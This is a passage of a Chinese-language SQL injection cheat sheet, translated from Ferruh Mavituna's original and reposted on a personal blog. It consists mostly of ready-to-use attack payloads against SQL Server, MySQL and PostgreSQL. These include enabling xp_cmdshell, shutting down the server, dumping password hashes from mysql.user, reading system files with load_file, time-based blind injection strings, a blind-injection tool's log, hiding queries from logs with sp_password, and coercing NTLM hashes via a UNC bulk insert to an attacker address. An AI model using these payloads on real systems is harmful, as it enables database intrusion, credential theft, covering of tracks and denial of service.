SHOWCONTIG”</code></p><p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx" target="_blank" rel="external">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p><p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p><h4>使用LIMIT(M)或ORDER(MSO)的注入</h4><p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,’x’/<em>,10 ;</em></code></p><p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p><h4>关掉SQL Server(S)</h4><p>如果你真的急了眼，<code>‘;shutdown –</code></p><h3>在SQL Server 2005中启用xp_cmdshell</h3><p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p><pre><code>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE<br><br>EXEC sp_configure ‘xp_cmdshell’,1<br>RECONFIGURE<br></code></pre><h3>探测SQL Server数据库的结构(S)</h3><h4>获取用户定义表</h4><p><code>SELECT name FROM sysobjects WHERE xtype = ‘U’</code></p><h4>获取字段名</h4><p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘tablenameforcolumnnames’)</code></p><h3>移动记录(Moving records)(S)</h3><ul><li><p>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong><code>… WHERE users NOT IN (‘First User’, ‘Second User’)</code><code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> – 这个好用</p></li><li><p>脏的不行的小技巧</p><p><code>SELECT  FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p><p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=’U’ and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = ‘U’) as p where p.x=21</code></p></li></ul><h3>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3><p><code>‘;BEGIN DECLARE @rt varchar(8000) SET @rd=’:’ SELECT @rd=@rd+’ ‘+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘MEMBERS’) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;–</code></p><p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/" target="_blank" rel="external">Fast way to extract data from Error Based SQL Injections</a></strong></p><h3>盲注</h3><h4>关于盲注</h4><p>一个经过完整而优秀开发的应用一般来说你是<strong>看不到错误提示的</strong>，所以你是没办法从Union攻击和错误中提取出数据的</p><p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p><p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p><p>在一般盲注下你能够使用<strong>If语句</strong>或者<strong>WHERE查询注入<strong><em>(一般来说比较简单)</em>，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用</strong>WAIT FOR DELAY ‘0:0:10’</strong>，在MySQL中使用<strong>BENCHMARK()</strong>，在PostgreSQL中使用<strong>pg_sleep(10)</strong>，以及在ORACLE中的一些<strong>PL/SQL小技巧</strong>。</p><h4>实战中的盲注实例</h4><p>以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p><p><strong>TRUE</strong>和<strong>FALSE</strong>标志代表了查询返回了true或false</p><pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78–<br><br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103–<br><br>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89–<br><br>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83–<br><br>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80–<br><br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br></code></pre><p>由于上面<strong>后两个查询都是false</strong>，我们能清楚的知道表名的第一个<strong>字符的ASCII码是80，也就是”P”</strong>。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。</p><h3>延时盲注</h3><p>首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。</p><h4><code>WAITFOR DELAY [time]</code>(S)</h4><p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p><p><code>WAITFOR DELAY ‘0:0:10’–</code></p><p>你也可以这样用</p><p><code>WAITFOR DELAY ‘0:0:0.51’</code></p><h4>实例</h4><ul><li>俺是sa吗？<br>    <code>if (select user) = ‘sa’ waitfor delay ‘0:0:10’</code></li><li>ProductID =<code>1;waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1);waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1’;waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1’);waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1));waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1’));waitfor delay ‘0:0:10’–</code></li></ul><h4><code>BENCHMARK()</code>(M)</h4><p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。<br><code>BENCHMARK(howmanytimes, do this)</code></p><h4>实例</h4><ul><li><p>俺是root吗？爽！<br>    <code>IF EXISTS (SELECT <em> FROM users WHERE username = ‘root’) BENCHMARK(1000000000,MD5(1))</em></code></p></li><li><p>判断表是否存在<br>    <code>IF (SELECT  FROM login) BENCHMARK(1000000,MD5(1))</code></p></li></ul><h4><code>pg_sleep(seconds)</code>(P)</h4><p>睡眠指定秒数。</p><ul><li><code>SELECT pg_sleep(10);</code>睡个十秒</li></ul><h3>掩盖痕迹</h3><h4><code>-sp_password log bypass</code>(S)</h4><p>出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p><h3>注入测试</h3><p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p><ol><li><p><code>product.asp?id=4 (SMO)</code></p><ol><li><code>product.asp?id=5-1</code></li><li><code>product.asp?id=4 OR 1=1</code></li></ol></li><li><p><code>product.asp?name=Book</code></p><ol><li><code>product.asp?name=Bo’%2b’ok</code></li><li><code>product.asp?name=Bo’ || ’ok (OM)</code></li><li><code>product.asp?name=Book’ OR ‘x’=’x</code></li></ol></li></ol><h3>一些其他的MySQL笔记</h3><ul><li>子查询只能在MySQL4.1+使用</li><li>用户<ul><li><code>SELECT User,Password FROM mysql.user;</code></li></ul></li><li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=’2’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></li><li><code>SELECT … INTO DUMPFILE</code><ul><li>把查询写入一个<strong>新文件</strong>中(不能修改已有文件)</li></ul></li><li>UDF功能<ul><li><code>create function LockWorkStation returns integer soname ‘user32’;</code></li><li><code>select LockWorkStation();</code></li><li><code>create function ExitProcess returns integer soname ‘kernel32’;</code></li><li><code>select exitprocess();</code></li></ul></li><li><code>SELECT USER();</code></li><li><code>SELECT password,USER() FROM mysql.user;</code></li><li>admin密码哈希的第一位<ul><li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li></ul></li><li>文件读取<ul><li><code>query.php?user=1+union+select+load_file(0x63…),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li></ul></li><li>MySQL读取文件内容<ul><li><strong>默认这个功能是没开启的！</strong><pre><code>create table foo( line blob );<br>load data infile ‘c:/boot.ini’ into table foo;<br>select * from foo;<br></code></pre><ul><li>MySQL里的各种延时</li><li><code>select benchmark( 500000, sha1( ‘test’ ) );<br>query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li><li><code>select if( user() like ‘root@%’, benchmark(100000,sha1(‘test’)), ‘false’ );</code></li><li><strong>遍历数据，暴力猜解</strong><ul><li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1(‘test’)), ‘false’ );</code></li></ul></li></ul></li></ul></li></ul><h4>MySQL中好用的函数</h4><ul><li><p><code>MD5()</code></p><p>MD5哈希</p></li><li><p><code>SHA1()</code> </p><p>SHA1哈希</p></li><li><p><code>PASSWORD()</code></p></li><li><code>ENCODE()</code></li><li><p><code>COMPRESS()</code> </p><p>压缩数据，在盲注时读取大量数据很好用</p></li><li><p><code>ROW_COUNT()</code></p></li><li><code>SCHEMA()</code></li><li><p><code>VERSION()</code></p><p>跟<code>@@version</code>是一样的</p></li></ul><h3>SQL注入的高级使用</h3><p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p><blockquote><p>Name:<code>‘ + (SELECT TOP 1 password FROM users ) + ‘</code></p><p>Email : <code>xx@xx.com</code></p></blockquote><p>如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。</p><h4>强制SQL Server来得到NTLM哈希</h4><p>这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。</p><h4>Bulk insert UNC共享文件 (S)</h4><p><code>bulk insert foo from ‘\YOURIPADDRESS\C$\x.txt’</code></p><h2><span data-wiz-span="data-wiz-span" style="font-size: 10.5pt; font-weight: normal;">转自：<a href="http://yinz.me/Security/22/" target="_blank" rel="external">http://yinz.me/Security/22/</a></span></h2><p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell" target="_blank" rel="external">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p><p><small><em>文档版本：1.4</em></small></p></body></html>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag"># 安全</a>
+          
+            <a href="/tags/sql/" rel="tag"># sql</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/01/assembly-python/" rel="next" title="assembly-python">
+                <i class="fa fa-chevron-left"></i> assembly-python
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">tenshine</p>
+              <p class="site-description motion-element" itemprop="description">喜欢就买,不行就分,多喝热水,重启试试</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">关于SQL注入速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">语法参考，攻击样例以及注入小技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.1.</span> <span class="nav-text">行间注释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.1.1.</span> <span class="nav-text">使用了行间注释的SQL注入攻击样例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.2.</span> <span class="nav-text">行内注释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.2.1.</span> <span class="nav-text">使用了行内注释的注入攻击样例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.2.2.</span> <span class="nav-text">MySQL版本探测攻击样例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.3.</span> <span class="nav-text">堆叠查询(Stacking Queries)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.3.1.</span> <span class="nav-text">支持堆叠查询的语言/数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.3.2.</span> <span class="nav-text">关于MySQL和PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.3.3.</span> <span class="nav-text">堆叠注入攻击样例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.4.</span> <span class="nav-text">If语句</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.4.1.</span> <span class="nav-text">MySQL的If语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.4.2.</span> <span class="nav-text">SQL Server的If语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.4.3.</span> <span class="nav-text">使用了If语句的注入攻击样例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.5.</span> <span class="nav-text">整数(Integers)的使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.6.</span> <span class="nav-text">字符串操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.6.1.</span> <span class="nav-text">字符串的串联</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.7.</span> <span class="nav-text">没有引号的字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.7.1.</span> <span class="nav-text">使用了16进制的注入攻击样例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.8.</span> <span class="nav-text">字符串异化(Modification)与联系</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.9.</span> <span class="nav-text">Union注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.9.1.</span> <span class="nav-text">UNION-语言问题处理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.10.</span> <span class="nav-text">绕过登陆界面(SMO+)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.11.</span> <span class="nav-text">绕过检查MD5哈希的登陆界面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.11.1.</span> <span class="nav-text">绕过MD5哈希检查的例子(MSP)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.12.</span> <span class="nav-text">基于错误(Error Based)-探测字段名</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.12.1.</span> <span class="nav-text">使用HAVING来探测字段名(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.12.2.</span> <span class="nav-text">在SELECT查询中使用ORDER BY探测字段数(MSO+)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.13.</span> <span class="nav-text">数据类型、UNION、之类的</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.13.1.</span> <span class="nav-text">获取字段类型</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.14.</span> <span class="nav-text">简单的注入(MSO+)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.</span> <span class="nav-text">有用的函数、信息收集、内置程序、大量注入笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.1.</span> <span class="nav-text">@@version(MS)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.2.</span> <span class="nav-text">文件插入(Bulk Insert)(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.3.</span> <span class="nav-text">BCP(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.4.</span> <span class="nav-text">SQL Server的VBS/WSH(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.5.</span> <span class="nav-text">执行系统命令，xp_cmdshell(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.6.</span> <span class="nav-text">SQL Server中的一些特殊的表(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.7.</span> <span class="nav-text">SQL Server的其它内置程序(S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.8.</span> <span class="nav-text">大量MSSQL笔记</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.9.</span> <span class="nav-text">使用LIMIT(M)或ORDER(MSO)的注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.15.10.</span> <span class="nav-text">关掉SQL Server(S)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.16.</span> <span class="nav-text">在SQL Server 2005中启用xp_cmdshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.17.</span> <span class="nav-text">探测SQL Server数据库的结构(S)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.17.1.</span> <span class="nav-text">获取用户定义表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.17.2.</span> <span class="nav-text">获取字段名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.18.</span> <span class="nav-text">移动记录(Moving records)(S)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.19.</span> <span class="nav-text">快速的脱掉基于错误(Error Based)的SQL Server注入(S)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.20.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.20.1.</span> <span class="nav-text">关于盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.20.2.</span> <span class="nav-text">实战中的盲注实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.21.</span> <span class="nav-text">延时盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.21.1.</span> <span class="nav-text">WAITFOR DELAY [time](S)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.21.2.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.21.3.</span> <span class="nav-text">BENCHMARK()(M)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.21.4.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.21.5.</span> <span class="nav-text">pg_sleep(seconds)(P)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.22.</span> <span class="nav-text">掩盖痕迹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.22.1.</span> <span class="nav-text">-sp_password log bypass(S)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.23.</span> <span class="nav-text">注入测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.24.</span> <span class="nav-text">一些其他的MySQL笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.24.1.</span> <span class="nav-text">MySQL中好用的函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.25.</span> <span class="nav-text">SQL注入的高级使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.25.1.</span> <span class="nav-text">强制SQL Server来得到NTLM哈希</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">3.25.2.</span> <span class="nav-text">Bulk insert UNC共享文件 (S)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">转自：http://yinz.me/Security/22/</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tenshine</span>
+
+  
+</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共24.4k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
